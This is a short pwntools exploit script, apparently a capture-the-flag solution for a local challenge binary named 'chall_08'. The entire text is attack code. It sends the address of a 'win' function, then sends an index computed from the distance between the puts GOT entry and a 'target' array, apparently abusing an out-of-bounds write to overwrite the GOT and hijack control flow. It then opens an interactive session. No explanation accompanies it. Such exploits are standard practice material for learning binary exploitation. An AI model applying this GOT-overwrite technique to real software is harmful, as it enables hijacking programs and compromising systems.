from pwn import *
p=process("./chall_08")
elf=ELF("./chall_08")
payload = bytes(str(elf.sym.win),'utf-8')
p.sendline(payload)
offset = bytes(str((elf.got.puts - elf.sym.target) // 8),'utf-8')
p.sendline(offset)
p.interactive()
